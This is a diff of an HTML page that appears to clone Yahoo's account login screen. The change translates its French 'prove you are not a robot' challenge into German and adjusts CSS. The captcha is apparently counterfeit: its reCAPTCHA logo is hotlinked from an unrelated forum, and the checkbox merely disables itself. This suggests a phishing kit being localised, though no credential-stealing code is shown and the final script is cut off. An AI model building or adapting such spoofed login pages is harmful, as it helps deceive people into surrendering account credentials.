@@ -30,7 +30,7 @@
 
         .puree-spinner-button:after {
             top: unset !important;
-            bottom: 44.5% !important;
+            bottom: 42.5% !important;
             right: 9% !important;
         }
 
@@ -71,6 +71,7 @@
         .text {
             font-weight: 500;
             margin-right: 1em;
+            font-size: .8rem;
         }
 
         .spinner {
@@ -284,7 +285,7 @@
                 </a>
             </span>
             <span class="column help txt-align-right">
-                <a href="https://help.yahoo.com/kb/index?locale=fr_FR&amp;page=product&amp;y=PROD_ACCT">Aide</a>
+                <a href="https://help.yahoo.com/kb/index?locale=fr_FR&amp;page=product&amp;y=PROD_ACCT">Hilfe</a>
             </span>
         </div>
         <div class="login-box-container">
@@ -297,25 +298,25 @@
                 <div class="challenge recaptcha-challenge">
                     <div class="recaptcha-script" id="recaptcha-script">
                         <h1 class="txt-align-center">
-                            Prouvez que vous n'êtes pas un&nbsp;robot
+                            Beweisen Sie, dass Sie keine Maschine&nbsp;sind
                         </h1>
                         <div class="captcha">
                             <div class="spinner">
                                 <label>
-                                    <input id="check-cap" value="0" type="checkbox" onclick="this.disabled = true;" />
+                                    <input id="check-cap" type="checkbox" onclick="this.disabled = true;"/>
                                     <span class="checkmark"><span>&nbsp;</span></span>
                                 </label>
                             </div>
-                            <div class="text">I'm not a robot</div>
+                            <div class="text">Ich bin kein Roboter</div>
                             <div class="cp-logo">
                                 <img src="https://forum.nox.tv/core/index.php?media/9-recaptcha-png/" />
                                 <p>reCAPTCHA</p>
-                                <small>Privacy - Terms</small>
+                                <small>Datenschutz - Nutzungsbedingungen</small>
                             </div>
                         </div>
                         <button type="submit" id="recaptcha-submit"
                             class="m-t-16px pure-button puree-button-primary puree-spinner-button" disabled="">
-                            Continuer
+                            Weiter
                         </button>
                         <script nonce="">
                             var submitButton = document.getElementById("recaptcha-submit"),
